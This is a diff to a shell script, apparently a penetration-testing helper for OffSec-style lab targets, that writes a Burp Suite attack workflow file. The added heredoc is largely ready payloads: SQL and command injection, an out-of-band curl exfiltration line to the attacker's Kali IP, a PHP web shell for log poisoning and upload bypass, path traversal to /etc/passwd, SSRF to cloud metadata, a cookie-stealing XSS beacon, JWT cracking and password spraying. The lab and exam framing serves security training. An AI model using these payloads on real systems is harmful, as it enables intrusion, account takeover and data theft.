@@ -608,12 +608,128 @@ PYEOF
 
     # --- Operator workflow notes grounded in this target URL ---
     {
-        echo "# Burp workflow for $url"
-        echo "1. Proxy browser traffic through Burp and click all discovered app features."
-        echo "2. Review Proxy HTTP history for non-static endpoints, redirects, cookies, and hidden parameters."
-        echo "3. Send interesting requests to Repeater; test auth bypass, IDOR, upload handling, and command/file parameters manually."
-        echo "4. Compare anonymous vs authenticated responses if credentials are found."
-        echo "5. Save exploitable request/response pairs beside these artifacts as evidence."
+        local host_only port_only
+        host_only=$(get_host "$url")
+        port_only=$(get_port "$url")
+        cat <<BURP
+# Burp Suite workflow for $url
+# Kali IP: $KALI_IP   (substituted below; update if wrong)
+
+[1] SETUP
+    Browser proxy:   127.0.0.1:8080   (Burp default)
+    Target > Scope > add:  $url         (Advanced scope control: ON)
+    Proxy > Options > Intercept: OFF initially   (let everything flow through)
+    Install extensions (BApp Store): Logger++, Active Scan++, Param Miner,
+                                     Turbo Intruder, JWT Editor, Autorize, Hackvertor
+
+[2] MAP THE APP (~5 min)
+    Click every link + submit every form with junk data.
+    Target > Site map > right-click $host_only > Engagement tools > Analyze Target
+        (shows params, cookies, hidden fields).
+    Also run the built-in crawl: Target > right-click host > Scan > Crawl only.
+
+[3] SEND THESE TO REPEATER (Ctrl-R on each)
+    - Every form: /login, /search, /upload, /contact, /comment, /register
+    - Every URL with a param: ?id= ?page= ?file= ?url= ?redirect= ?cmd= ?template=
+    - Every request carrying JWT/session cookie
+    - Any authenticated endpoint  (then compare to anon — Comparer)
+
+[4] ATTACKS BY PARAM TYPE  (test in Repeater; then Intruder for lists)
+
+  SQL injection (login, search, id params):
+    '   "   ' OR '1'='1-- -     admin'-- -     ") OR ("1"="1
+    ') OR 1=1-- -                # closes parenthesized query
+    UNION-based:  ' UNION SELECT NULL,NULL-- -   (increment NULLs to match col count)
+    Time-based:   ' AND SLEEP(5)-- -    " AND (SELECT SLEEP(5))-- -
+    Intruder Sniper wordlist:  /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
+    Or drop to sqlmap once a param looks vulnerable:
+      sqlmap -u "$url/path?id=1" --batch --dbs --level=3 --risk=2
+      sqlmap -r req.txt --batch --dbs   # if cookies/POST matter
+
+  Command injection (ping, lookup, filename, download params):
+    ;id   |id   \`id\`   \$(id)   %0aid   ||id   && id
+    blind (no output):  ;sleep 5    \`sleep 5\`
+    OOB (detect + exfil):
+      ;curl http://$KALI_IP/\$(whoami)
+      Then on Kali:  python3 -m http.server 80
+
+  LFI / path traversal (file, page, template, lang params):
+    ../../../../etc/passwd          (5-8 levels of ../ is typical)
+    ....//....//....//etc/passwd    (double-dot bypass)
+    %2e%2e%2fetc%2fpasswd           (URL-encoded)
+    php://filter/convert.base64-encode/resource=index   (PHP source read)
+    Windows:  ../../../../windows/system32/drivers/etc/hosts
+    Log poisoning (LFI -> RCE):
+      1. Send:  GET / HTTP/1.1  with  User-Agent: <?php system(\$_GET['c']); ?>
+      2. Read:  ?file=/var/log/apache2/access.log&c=id
+               or /var/log/nginx/access.log, /proc/self/environ (if readable)
+
+  Auth bypass:
+    Login SQLi:    admin' OR 1=1-- -    admin'/*
+    JWT attacks:   JWT Editor > alg:none (re-sign with empty key)
+                   Weak HMAC secret: hashcat -m 16500 jwt.txt rockyou.txt
+                   kid path traversal: kid:"../../../../dev/null"
+    Cookie tamper: user_id=1 -> 0, role=user -> admin, isAdmin=false -> true
+    Header tricks: X-Forwarded-For: 127.0.0.1
+                   X-Original-URL: /admin          X-Rewrite-URL: /admin
+                   X-Remote-User: admin            X-Remote-Addr: 127.0.0.1
+
+  File upload bypass:
+    Content-Type override: send PHP body with Content-Type: image/jpeg
+    Double extension:      shell.php.jpg   shell.php.png   shell.php%00.jpg
+    Alt PHP exts:          shell.phtml  shell.phar  shell.php5  shell.php7
+    Case variants:         shell.PhP    shell.pHp
+    Magic-byte prefix:     prepend GIF89a; then <?php system(\$_GET['c']); ?>
+    After upload find with: ffuf -u $url/uploads/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
+
+  SSRF (url, redirect, callback, webhook, image_url params):
+    http://127.0.0.1:22     http://127.0.0.1:80/    http://localhost/admin
+    Cloud metadata:         http://169.254.169.254/latest/meta-data/
+    Filter bypasses:        http://[::]:80         http://0.0.0.0
+                            http://127.0.0.1.nip.io
+                            http://localhost.@evil.com
+                            http://2130706433        (decimal for 127.0.0.1)
+
+  IDOR:
+    Change any id/user/order/doc/file param up or down by 1.
+    Use Intruder > Sniper with payload: Numbers 1-1000 step 1.
+    Status 200 carrying another user's data = IDOR confirmed.
+
+  XSS (comment, search, display params):
+    "><script>alert(1)</script>     '><img src=x onerror=alert(1)>
+    Event handlers to try: onerror onload onfocus onmouseover
+    For reflected-only targets: ignore (not OffSec scorable).
+    For stored XSS with admin viewing: swap alert to cookie exfil
+      <script>new Image().src='http://$KALI_IP/?c='+document.cookie</script>
+
+[5] INTRUDER WORKFLOWS
+  Username enumeration (find valid users by response length):
+    POST /login  body: username=§FUZZ§&password=x
+    wordlist:  /usr/share/seclists/Usernames/Names/names.txt
+    wordlist:  /usr/share/seclists/Usernames/top-usernames-shortlist.txt
+    Look at the Length column; group by size, pick the outliers.
+
+  Password spray (never brute one user from scratch):
+    POST /login  body: username=admin&password=§FUZZ§
+    wordlist:  /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+    If lockout protection exists, use Turbo Intruder with 3/min pacing.
+
+  Parameter mining (find hidden params):
+    GET /?§FUZZ§=test   or Param Miner extension on the request
+    wordlist:  /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+    Grep Extract on response to detect reflected value -> likely live param.
+
+  Cluster Bomb (user × pass combined wordlists):
+    Two payload positions.  Use for "spray small lists of common creds".
+
+[6] DIFFING  (Comparer + Decoder)
+    Comparer: anon-response vs auth-response (right-click > Send to Comparer).
+    Decoder:  base64 cookies, URL-encoded params, JWT payload inspection.
+
+[7] EVIDENCE
+    Right-click request > Save item    -> $outdir/evidence/<vuln>_<time>.req
+    File > Save project as             -> $outdir/burp_project.burp
+BURP
     } > "$outdir/burp_workflow.txt"
 
     progress_log "$2" "DONE" "$phase_name" ""
